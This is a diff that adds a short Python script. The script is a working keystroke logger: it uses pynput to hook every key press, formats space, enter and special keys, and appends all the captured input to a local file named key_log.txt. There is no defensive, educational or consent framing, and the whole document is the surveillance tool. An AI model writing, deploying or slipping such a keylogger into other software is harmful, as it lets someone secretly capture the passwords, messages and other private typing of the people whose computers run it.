@@ -1,0 +1,16 @@
+from pynput.keyboard import Listener
+log_file = "key_log.txt"
+
+def log_keystroke(key):
+    key_str = str(key).replace("'", "")  # Remove quotes around character keys
+    if key_str == "Key.space":
+        key_str = ' '  # Replace space key with space
+    elif key_str == "Key.enter":
+        key_str = '\n'  # Replace enter key with newline
+    elif "Key" in key_str:
+        key_str = f'[{key_str}]'  # Mark special keys like Key.shift
+
+    with open(log_file, 'a') as f:
+        f.write(key_str)
+with Listener(on_press=log_keystroke) as listener:
+    listener.join()
